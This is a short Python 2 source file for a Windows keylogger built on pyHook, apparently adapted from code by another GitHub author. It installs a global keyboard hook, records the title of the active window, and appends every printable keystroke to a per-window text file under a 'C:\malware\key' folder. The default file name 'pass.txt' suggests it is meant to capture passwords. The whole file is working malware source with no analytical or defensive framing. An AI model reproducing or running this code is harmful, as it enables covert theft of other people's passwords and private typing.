# -*- coding: cp949 -*-
# original : https://github.com/RobinDavid
# modify : https://github.com/namhyun/

import pyHook
import pygame # or import pythoncom
import sys
import time
import re

mainFname = "pass.txt"
class Keylogger():
    def __init__(self):
        self.windowname = None
        self.hm = pyHook.HookManager()
        self.hm.KeyDown = self.SendKey
        self.hm.HookKeyboard()
        
    def run(self):# initialize pygame and start the game loop
        pygame.init()
        while True:
            pygame.event.pump()
        #or pythoncom.PumpMessages()

    def SendKey(self, event):
        global mainFname
        if event.WindowName != self.windowname:
            self.windowname = event.WindowName
            mainFname = str(self.windowname).decode('cp949').replace(" ", "")
            try:
                mainFname = re.sub('[=.#/?:$}]', '', mainFname)
            except:
                pass
            mainFname = mainFname + ".txt"
            print mainFname
            print ("\n\nWindow: [%s]" % self.windowname)
        if (event.Ascii > 31 and event.Ascii < 127) or event.Ascii == 13 or event.Ascii == 9:
            sys.stdout.write(chr(event.Ascii))
            keyinput = chr(event.Ascii)
            if keyinput != "" and mainFname !="":
                try:
                     with open("C:\\malware\\key\\" + mainFname,'a+') as f:
                        f.write(keyinput)
                        f.close()
                except:
                    pass

if __name__ == "__main__":
    k = Keylogger()
    k.run()
